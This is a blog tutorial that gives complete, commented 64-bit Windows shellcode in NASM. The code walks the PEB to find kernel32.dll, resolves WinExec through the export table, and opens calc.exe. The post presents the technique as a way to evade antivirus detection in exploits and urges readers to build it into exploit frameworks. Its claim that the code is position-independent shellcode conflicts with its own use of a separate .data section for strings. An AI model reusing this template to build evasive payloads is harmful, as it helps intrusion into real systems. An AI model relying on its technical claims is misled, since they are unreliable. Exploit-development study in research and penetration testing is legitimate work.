<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Writing 64-bit Shellcode to Dynamically Resolve Kernel32.dll and Open calc.exe - MALD3V</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 20px;
            padding: 20px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            background-color: #ffffff;
        }
        h1 {
            color: #2d3748;
            margin-top: 0;
        }
        p {
            line-height: 1.8;
            color: #4a5568;
        }
        h2 {
            color: #2d3748;
            margin-top: 20px;
        }
        ul {
            line-height: 1.8;
            color: #4a5568;
            list-style-type: disc;
            margin-left: 20px;
        }
        pre {
            background-color: #f7f7f7;
            padding: 10px;
            border-radius: 8px;
            overflow-x: auto;
        }
        code {
            font-family: 'Courier New', Courier, monospace;
            font-size: 1em;
            color: #c7254e;
            background-color: #f9f2f4;
            padding: 2px 4px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <h1>Writing 64-bit Shellcode to Dynamically Resolve Kernel32.dll and Open calc.exe</h1>
    
    <p>
        When developing exploits, particularly for penetration testing or research, one common task is to inject shellcode into a vulnerable application. However, using tools like <code>msfvenom</code> to generate shellcode often results in payloads that are quickly flagged by antivirus software. This is because these generated shellcodes follow predictable patterns that modern AV engines are trained to detect. To overcome this challenge, we'll write our own custom 64-bit shellcode that dynamically resolves function addresses in <code>kernel32.dll</code> and opens <code>calc.exe</code>. This process not only avoids detection but also gives you more control over the shellcode's behavior.
    </p>

    <p>
        In this tutorial, we'll write the shellcode in assembly, compile it, and later extract the raw shellcode bytes for use in our exploits.
    </p>

    <h2>The Challenge</h2>
    <p>
        Shellcode must be position-independent, meaning it can execute correctly regardless of where in memory it is placed. Additionally, it needs to dynamically resolve necessary function addresses at runtime, as hardcoding addresses is unreliable across different systems. This ensures that the shellcode is both flexible and stealthy.
    </p>

    <h2>The Solution</h2>
    <p>
        We'll create shellcode that:
    </p>
    <ul>
        <li>Dynamically resolves the base address of <code>kernel32.dll</code>.</li>
        <li>Locates the address of <code>WinExec</code> using the Export Address Table.</li>
        <li>Calls <code>WinExec</code> to open <code>calc.exe</code>.</li>
        <li>Cleans up by calling <code>ExitProcess</code> to exit gracefully.</li>
    </ul>

    <h2>Prerequisites</h2>
    <p>
        To compile and run this assembly code, you will need the following:
    </p>
    <ul>
        <li><strong>NASM (Netwide Assembler):</strong> A popular assembler used for writing assembly code.</li>
        <li><strong>Microsoft Visual Studio:</strong> Specifically, the <code>link.exe</code> tool provided by Visual Studio is required to link the assembled object file into an executable.</li>
    </ul>

    <h2>Compilation Commands</h2>
    <p>
        Once you have written the assembly code in a file (e.g., <code>shellcode.asm</code>), you can compile and link it using the following commands:
    </p>

    <pre><code>nasm -f win64 shellcode.asm -o shellcode.o
link /SUBSYSTEM:CONSOLE /MACHINE:X64 /ENTRY:_start shellcode.o /OUT:shellcode.exe
    </code></pre>

    <p>
        These commands will produce an executable (<code>shellcode.exe</code>) that, when run, will open <code>calc.exe</code>.
    </p>

    <h2>Full Assembly Code with Comments</h2>

    <pre><code>section .data
    kernel32_dll    db  'KERNEL32.DLL', 0          ; String for the kernel32.dll library
    loadlib_func    db  'LoadLibraryA', 0          ; String for LoadLibraryA function
    winexec_func    db  'WinExec', 0               ; String for WinExec function
    calc_str        db  'calc.exe', 0              ; Command to open calc.exe
    exitproc_func   db  'ExitProcess', 0           ; String for ExitProcess function

section .text
global _start

_start:
    sub rsp, 28h            ; Reserve stack space for function calls (align stack)

    ; 1. Resolve LoadLibraryA to dynamically load DLLs if needed
    lea rdx, [rel loadlib_func]  ; Load the address of the LoadLibraryA string into rdx
    lea rcx, [rel kernel32_dll]  ; Load the address of the kernel32.dll string into rcx
    call lookup_api         ; Call lookup_api to resolve the address of LoadLibraryA
    mov r15, rax            ; Save the address of LoadLibraryA in r15 for later use

    ; 2. Load kernel32.dll (it's already loaded, but this demonstrates the mechanism)
    lea rcx, [rel kernel32_dll]  ; Load the address of the kernel32.dll string into rcx
    call rax                ; Call LoadLibraryA (stored in rax) to load kernel32.dll

    ; 3. Resolve the address of WinExec
    lea rdx, [rel winexec_func]  ; Load the address of the WinExec string into rdx
    lea rcx, [rel kernel32_dll]  ; Load the address of the kernel32.dll string into rcx
    call lookup_api         ; Call lookup_api to resolve the address of WinExec

    ; 4. Call WinExec to open calc.exe
    lea rcx, [rel calc_str] ; Load the address of the calc.exe string into rcx
    mov rdx, 1              ; Set uCmdShow = SW_SHOWNORMAL (show the window)
    call rax                ; Call WinExec with the parameters set above

    ; 5. Resolve the address of ExitProcess
    lea rdx, [rel exitproc_func]  ; Load the address of the ExitProcess string into rdx
    lea rcx, [rel kernel32_dll]   ; Load the address of the kernel32.dll string into rcx
    call lookup_api         ; Call lookup_api to resolve the address of ExitProcess

    xor rcx, rcx            ; Set the exit code to 0 (normal exit)
    call rax                ; Call ExitProcess to terminate the process

; lookup_api: Look up the address of a function within a DLL's export table
; rcx=DLL name string, rdx=function name string
; returns the function's address in rax
lookup_api:
    sub rsp, 28h            ; Align the stack

    ; Access the PEB (Process Environment Block) to find the base address of kernel32.dll
    mov r8, gs:[60h]        ; Load the PEB base address into r8
    mov r8, [r8+18h]        ; Follow the pointer to the PEB_LDR_DATA structure
    lea r12, [r8+10h]       ; Get the address of the InLoadOrderModuleList list head
    mov r8, [r12]           ; Move to the first entry in the InLoadOrderModuleList list

    cld                     ; Clear the direction flag for string operations

for_each_dll:               ; Loop through the list of loaded modules
    mov rdi, [r8+60h]       ; Get the UNICODE_STRING.Buffer pointer (module name) in rdi
    mov rsi, rcx            ; Load the DLL name string we're looking for into rsi

compare_dll:
    lodsb                   ; Load a byte from rsi into al (pointed to by rsi)
    test al, al             ; Test if we've reached the end of the DLL name string
    jz found_dll            ; If so, we've found the matching DLL

    mov ah, [rdi]           ; Load a byte from the current module name into ah
    cmp ah, 61h             ; Compare with lowercase 'a'
    jl uppercase            ; If less, it's uppercase already
    sub ah, 20h             ; Convert lowercase to uppercase

uppercase:
    cmp ah, al              ; Compare the characters
    jne wrong_dll           ; If they don't match, this isn't the right DLL

    inc rdi                 ; Move to the next character in the module name
    inc rdi                 ; UNICODE_STRING is wide (2 bytes per character)
    jmp compare_dll         ; Continue comparing the DLL name

wrong_dll:
    mov r8, [r8]            ; Move to the next LDR_DATA_TABLE_ENTRY (next module)
    cmp r8, r12             ; Compare to see if we've looped back to the start
    jne for_each_dll        ; If not, keep searching

    xor rax, rax            ; If DLL not found, return 0 in rax
    jmp done

found_dll:
    mov rbx, [r8+30h]       ; Get the DLL base address (points to DOS "MZ" header)
    mov r9d, [rbx+3Ch]      ; Get the e_lfanew field from the DOS header (PE header offset)
    add r9, rbx             ; r9 now points to the PE header
    add r9, 88h             ; Move to the Export Directory RVA in the optional header

    mov r13d, [r9]          ; Get the virtual address of the Export Directory
    test r13, r13           ; Test if the DLL has an export table
    jz done                 ; If not, return 0 in rax

    lea r8, [rbx+r13]       ; r8 now points to the Export Directory
    mov r14d, [r9+4]        ; Get the size of the Export Directory
    add r14, r13            ; Calculate the end of the Export Directory

    mov ecx, [r8+18h]       ; Get the number of names in the export table
    mov r10d, [r8+20h]      ; Get the AddressOfNames array RVA
    add r10, rbx            ; r10 now points to the AddressOfNames array

    dec ecx                 ; Decrement ecx to point to the last element
for_each_func:
    lea r9, [r10 + 4*rcx]   ; Load the RVA of the function name into r9

    mov edi, [r9]           ; Get the function name RVA
    add rdi, rbx            ; rdi now points to the function name string in memory
    mov rsi, rdx            ; Load the function name string we're looking for into rsi

compare_func:
    cmpsb                   ; Compare the strings byte by byte
    jne wrong_func          ; If they don't match, try the next function

    mov al, [rsi]           ; Load the current character of our function string
    test al, al             ; Test if we've reached the end of the string
    jz found_func           ; If so, we've found the matching function

    jmp compare_func        ; Continue comparing the function name

wrong_func:
    loop for_each_func      ; Try the next function in the export table

    xor rax, rax            ; If function not found, return 0 in rax
    jmp done

found_func:
    mov r9d, [r8+24h]       ; Get the AddressOfNameOrdinals array RVA
    add r9, rbx             ; r9 now points to the AddressOfNameOrdinals array
    mov cx, [r9+2*rcx]      ; Get the function's ordinal value

    mov r9d, [r8+1Ch]       ; Get the AddressOfFunctions array RVA
    add r9, rbx             ; r9 now points to the AddressOfFunctions array
    mov eax, [r9+rcx*4]     ; Get the function's address RVA using the ordinal
    add rax, rbx            ; Add the DLL base address to the RVA to get the function's address

done:
    add rsp, 28h            ; Restore the stack
    ret                     ; Return the function's address in rax
    </code></pre>

    <p>
        In this post, we explored how to write 64-bit shellcode that dynamically resolves function addresses in <code>kernel32.dll</code> and uses <code>WinExec</code> to open <code>calc.exe</code>. This approach is essential for creating robust, position-independent shellcode that works across different systems. By understanding how to navigate the Windows Process Environment Block (PEB) and the Export Address Table, you can craft shellcode that is both effective and flexible.
    </p>

    <p>
        Feel free to experiment with the code, modify it for different scenarios, or integrate it into larger exploit frameworks. Happy hacking!
    </p>

</body>
</html>

